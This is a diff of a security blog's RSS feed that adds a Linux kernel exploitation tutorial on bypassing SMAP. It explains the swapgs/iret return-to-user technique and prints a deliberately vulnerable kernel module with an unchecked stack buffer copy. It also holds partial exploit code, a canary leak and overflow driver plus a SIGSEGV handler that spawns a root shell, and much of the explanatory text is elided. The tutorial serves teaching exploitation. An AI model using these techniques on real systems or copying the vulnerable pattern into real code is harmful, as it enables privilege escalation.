@@ -1,4 +1,113 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Wed, 26 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</guid><description>Table of Contents Overview of SMEP Overwriting the Control Register A Vulnerable Kernel Module Building a ROP Chain Environment Setup Building the Exploit Overview of SMEP Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Thu, 27 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x03 :: Bypass SMAP with SIGSEGV Handler</title><link>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</link><pubDate>Thu, 27 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-3-bypass-smep/</guid><description>Table of Contents Overview of Supervisor Mode Access Prevention SMAP Bypass Techniques A Vulnerable Kernel Module Building a Complete Escalation Chain Environment Setup Building the Exploit Fixing the Exploit with a SIGSEGV Handler Overview of Supervisor Mode Access Prevention Supervisor mode access prevention (SMAP) is a kernel exploit mitigation feature that marks all user-space pages as non-accessible when the process is in kernel-space (slightly different to SMEP, as SMEP marks user-space pages as non-executable).</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+&lt;ol>
+&lt;li>&lt;a href="#overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#smap-bypass-techniques">SMAP Bypass Techniques&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#fixing-the-exploit-with-a-sigsegv-handler">Fixing the Exploit with a SIGSEGV Handler&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;h2 id="overview-of-supervisor-mode-access-prevention">Overview of Supervisor Mode Access Prevention&lt;/h2>
+&lt;p>Supervisor mode access prevention (SMAP) is a kernel exploit mitigation feature that marks all user-space pages as non-accessible when the process is in kernel-space (slightly different to SMEP, as SMEP marks user-space pages as non-executable). This means that read/write access to user-space pages is disabled.&lt;/p>
+&lt;p>When used in combination with SMEP, it will remove read / write / execution permissions from all user-space pages. This can be a powerful way to mitigate kernel exploitation.&lt;/p>
+&lt;p>As we cannot read or write user-space memory, we&amp;rsquo;ll have to find a different way to control process execution. We can (once again) do this via return-oriented programming (ROP).&lt;/p>
+&lt;h2 id="smap-bypass-techniques">SMAP Bypass Techniques&lt;/h2>
+&lt;p>Unlike SMEP, there isn&amp;rsquo;t a straight-forward way to simply bypass SMAP. Instead, we&amp;rsquo;ll have to craft a full exploit chain that replicates the return to user-space process. This way we&amp;rsquo;ll be able to return to user-space and execute arbitrary code with elevated privileges.&lt;/p>
+&lt;p>Here are the steps we need to take in order to return to user-space via ROP chain:&lt;/p>
+&lt;ul>
+&lt;li>Execute a &lt;code>swapgs&lt;/code> instruction to swap the ensure the GS register corresponds to user-space.&lt;/li>
+&lt;li>Execute an &lt;code>iret&lt;/code> instruction to restore our user-space registers.&lt;/li>
+&lt;li>Ensure that our &lt;code>iret&lt;/code> frame is positioned correctly at the top of the stack.&lt;/li>
+&lt;/ul>
+&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
+&lt;p>We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module ha.&lt;/p>
+&lt;p>For an overview of the vulnerabilities present in this kernel module, please read the post detailing the &lt;code>ret2usr&lt;/code> technique.&lt;/p>
+&lt;div class="collapsable-code">
+&lt;input id="1" type="checkbox" checked />
+&lt;label for="1">
+&lt;span class="collapsable-code__language">c&lt;/span>
+&lt;span class="collapsable-code__title">challenge.c&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-c" >&lt;code>
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/fs.h&amp;gt;
+#include &amp;lt;linux/proc_fs.h&amp;gt;
+#include &amp;lt;linux/uaccess.h&amp;gt;
+MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
+char out[256];
+static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
+{
+char tmp[128];
+return raw_copy_to_user(buf, tmp, len);
+}
+static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
+{
+char tmp[128];
+return raw_copy_from_user(tmp, buf, len);
+}
+static int challenge_open(struct inode *inode, struct file *fp)
+{
+return 0;
+}
+static int challenge_release(struct inode *inode, struct file *fp)
+{
+return 0;
+}
+static struct file_operations fops = {
+.read = challenge_read,
+.write = challenge_write,
+.open = challenge_open,
+.release = challenge_release
+};
+struct proc_dir_entry *proc_entry;
+int init_module(void)
+{
+proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
+return 0;
+}
+void cleanup_module(void)
+{
+if (proc_entry) {
+proc_remove(proc_entry);
+}
+}
+&lt;/code>&lt;/pre>
+&lt;/div>
+&lt;h2 id="building-a-complete-escalation-chain">Building a Complete Escalation Chain&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="fixing-the-exploit-with-a-sigsegv-handler">Fixing the Exploit with a SIGSEGV Handler&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">signal_handler&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> signum)
+{
+system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
+{
+save_user_space();
+&lt;span style="color:#75715e">/* register signal handler */&lt;/span>
+signal(SIGSEGV, signal_handler);
+&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
+assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
+&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
+printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
+overflow_buffer(fd, canary);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="appendix">Appendix&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/">KSMASH - Kernel Stack Smashing&lt;/a>&lt;/li>
+&lt;/ul></content></item><item><title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</guid><description>Table of Contents Overview of SMEP Overwriting the Control Register A Vulnerable Kernel Module Building a ROP Chain Environment Setup Building the Exploit Overview of SMEP Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
 &lt;ol>
 &lt;li>&lt;a href="#overview-of-smep">Overview of SMEP&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#overwriting-the-control-register">Overwriting the Control Register&lt;/a>&lt;/li>
